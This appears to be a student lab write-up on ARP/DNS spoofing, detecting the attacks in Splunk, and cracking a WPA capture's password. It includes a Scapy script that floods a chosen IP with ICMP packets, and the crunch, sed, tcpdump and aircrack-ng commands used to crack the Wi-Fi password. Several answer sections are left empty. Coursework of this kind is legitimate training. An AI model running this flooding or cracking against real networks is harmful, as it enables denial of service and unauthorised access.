# Implementation of Arpspoof tool and Splunk SIEM Tool with cracking password

## Use the arpspoof tool to perform the following attacks [10 Marks] 
  ### a. Use ARP packets to perform the DNS spoofing attack. Whatever the website the user types, it should navigate to http://testphp.vulnweb.com/login.php as a part of the attack.



![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/7aa715a7-f962-44f0-97cc-f385e310c1a2)

Victim: 

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/6bc5f582-d90e-4437-89a5-d24a3c943829)

Arp Spoof Started

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/20502860-fc28-4804-b4df-5574b945e6aa)

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/62716f88-d63d-40fe-afed-46705ce83537)

Dns Spoof Host

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/8986bd4a-d11a-48e5-bcae-b1766c17cf90)



  ### b. Use ICMP Packets to perform only DDOS attacks over the victim. 

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/86edcb21-1696-4996-bd73-bc886422d8e8)

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/bac150a5-3d56-4bf6-87b2-89101e60a150)

```
from scapy.all import *

# Function to send ICMP packets
def send_icmp_packet(dst_ip):
    icmp_packet = IP(dst=dst_ip)/ICMP()
    send(icmp_packet, loop=True, verbose=False)

# Main function
def main():
    target_ip = input("Enter the target IP address: ")
    while True:
        send_icmp_packet(target_ip)

if __name__ == "__main__":
    main()
```

DDOS Attack is performed



## 2. Use Splunk to answer the following questions:
  ### a. Capture these above attacks using Splunk in an active or passive method. (10 Marks)

Passive Method
![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/96ff1ae2-98f7-4f65-97ad-956fbe7bd15e)


![Uploading image.png…]()








  
  ### b. Identify and Analyse the Indicator of Compromise for the attack. (5 Marks)









  
  ### c. Explore and create an Alert for similar attacks in the Future. (5 Marks)


## 3. Use the given PCAP file to analyse and answer the following questions:

  ### a. Decrypt the traffic by cracking the password using appropriate tools and techniques. It is a must to mention briefly your method of cracking the password in the documentation. [HINT: password length – 16, Capital letter – 2, numerals – 6, It is a repetition of the same word as [CyberCyber].[6 Marks]

First we have to create a word list with `Crunch` command 

`crunch 8 8 ,@@@@123 -o temp.txt`

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/fc706b18-c6de-4d33-8ce2-d03f2880b1cd)

`sed "s/^\(.\{8\}\)$/\1\1/" temp.txt > final.txt`

then we will make for 16 characters with concatination command 

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/1483d82a-173b-49ec-8f8a-64de86e90157)

If we directly crack the password using the cap file it will show as unsupported file so we need to change the formate of the file with tcpdump tool
`tcpdump -r Downloads/midterm.cap -w output.pcap`

we have to crack password by using wordlist in `aircrack-ng tool`
`aircrack-ng output.pcap -w final.txt`

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/c8293b2b-a9aa-4c5c-99cf-81480c740b10)

Password Cracked: `Cisco123Cisco123`

  ### b. Analyse the decrypted traffic using tools to identify the malicious/suspicious activity recorded in the WLAN. [4 Marks]

Now we have to open Wireshark and add our password in keys to decypt the pcap file 

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/c34c9bfd-61b1-4177-9ff1-c22dbeeb61e7)

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/dd34ea48-917f-4a50-a1fa-146c9933d8a7)

On Analyzing the pcap file, we can get to know that Voip call is made throgh Skinny Protocol and all details regarding the call are available in this pcap 

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/4c571bf1-337d-49b6-8d31-4770dfc3dce3)

First Connection is established with Skinny Protocol then Communication is being performed RTP and at last connection is disabled

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/0a700cf5-0b81-4e30-985e-a38360ca6b5f)

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/2d425d52-d0ad-4e94-b561-9760d858cf32)









  
